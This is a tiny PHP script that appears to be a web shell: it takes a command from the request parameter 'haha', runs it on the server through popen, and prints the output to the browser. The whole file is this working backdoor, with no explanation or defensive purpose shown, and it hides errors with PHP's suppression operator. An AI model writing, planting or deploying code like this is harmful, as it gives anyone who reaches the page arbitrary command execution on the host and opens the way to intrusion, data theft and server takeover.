<?php
$c=@$_REQUEST[haha];
$fp = @popen($c,"r");
while (!feof($fp)){
    $out = fgets($fp, 4096);
    echo  $out."<br/>";
}
pclose($fp);
?>
